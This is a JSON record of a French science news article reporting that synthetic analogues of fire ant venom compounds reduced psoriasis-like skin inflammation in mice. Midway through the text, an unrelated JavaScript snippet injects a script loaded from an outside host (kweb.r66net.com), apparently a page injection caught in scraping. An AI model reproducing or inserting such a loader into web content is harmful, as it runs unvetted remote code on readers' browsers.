{"title": "Psoriasis : un remede trouve grace a la fourmi de feu ?", "newspaper": "Futura Sciences", "author": ["Marie-Celine Jacquier"], "date_publi": "2017-09-12", "content": "Des chercheurs ont mis au point des molecules proches de composes presents dans le venin de la fourmi de feu. Efficaces contre le psoriasis dans un modele animal, ces molecules pourraient permettre de nouveaux traitements de la peau chez des patients. Enfin un remede miracle ? Ce qu'il faut retenir La fourmi de feu  Solenopsis invicta  produit un venin contenant de la solenopsine, une molecule proche de lipides favorisant la sante de la peau. Des chercheurs ont cree des analogues de la solenopsine et les ont testes sur des souris modeles pour le psoriasis. Les analogues de la solenopsine reduisent les symptomes inflammatoires de la peau. Le  psoriasis  est une  maladie auto-immune  assez frequente, qui touche environ 2 % de la population francaise. Ses causes sont meconnues, bien que des facteurs  hereditaires  interviennent. Le psoriasis est une maladie chronique inflammatoire de la peau souvent traitee avec des cremes contenant des  steroides  (dermocorticoides), mais aussi des analogues de la  vitamine  D3. Cependant, les dermocorticoides presentent parfois des effets secondaires a long terme.  Le saviez-vous ? En complement des traitements contre le psoriasis, des produits emollients peuvent aider a hydrater la peau et lutter contre sa secheresse. Dans des cas graves de psoriasis, un traitement oral est parfois mis en place avec du methotrexate, des derives de la vitamine A ou de la ciclosporine ; des anti-TNFa peuvent etre administres en injections. Souvent presents dans des produits cosmetiques et de  soin pour la peau , les ceramides sont des  lipides  essentiels au maintien de la fonction barriere de cette derniere. Mais ces  molecules  sont converties par les cellules en sphingosine-1-phosphate (S1P), une molecule liee a l' inflammation  et la tumorigenese. Idealement, il serait interessant de disposer de molecules capables de restaurer la fonction barriere de la peau comme les ceramides, sans qu'elles n'induisent d'inflammation. Or, la solenopsine, un compose actif du  venin  de  fourmis de feu  ( Solenopsis invicta ), ressemble aux ceramides. Des chercheurs des universites Emory et Case Western Reserve (Etats-Unis) ont donc eu l'idee de mettre au point des analogues de la solenopsine qui ne seraient pas degrades en S1P. Ils ont teste leurs molecules sur un modele de souris pour le  psoriasis  (les souris KC-Tie2), en appliquant sur la peau une creme pendant 28 jours. Le psoriasis est une maladie chronique liee a un renouvellement trop rapide de l'epiderme, formant des plaques qui demangent. (c) quayside, Fotolia                               Les derives de la solenopsine reduisent l'inflammation de la peau Les analogues de la solenopsine ont reduit l'epaississement et l'inflammation de la  peau  : l'epaisseur de la peau des souris traitees diminuait de 30 % environ par rapport aux temoins ; de plus, les souris traitees avaient moitie moins de cellules immunitaires qui s'infiltraient dans la peau. Les composes ont aussi ete appliques a des cellules en culture. Cela a permis de diminuer la production cellulaire d'IL-22 (une  interleukine  qui envoie un signal inflammatoire) et d'augmenter la production d'IL-12 qui est  anti-inflammatoire .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  \" Les analogues de la solenopsine contribuent a la restauration complete de la fonction barriere de la peau. Pour Jack Arbiser, principal auteur de ces travaux, qui s'exprime dans un  communique ,  << nous croyons que les analogues de la solenopsine contribuent a la restauration complete de la fonction barriere de la peau >>.  Il ajoute que  << les emollients peuvent apaiser la peau dans le psoriasis, mais ils ne suffisent pas a la restauration de la barriere >>. Precedemment, son laboratoire a montre que la solenopsine est un inhibiteur de la croissance des vaisseaux sanguins et qu'il pourrait etre un agent anti-cancer.  Ces resultats paraissent dans la revue  Scientific Reports . Un test de chute pour fourmi de feu                       Les fourmis de feu construisent des galeries souterraines dont le diametre est semblable a leur longueur. C'est pour pouvoir se rattraper facilement en cas de chute !                                       ", "theme": "sante"}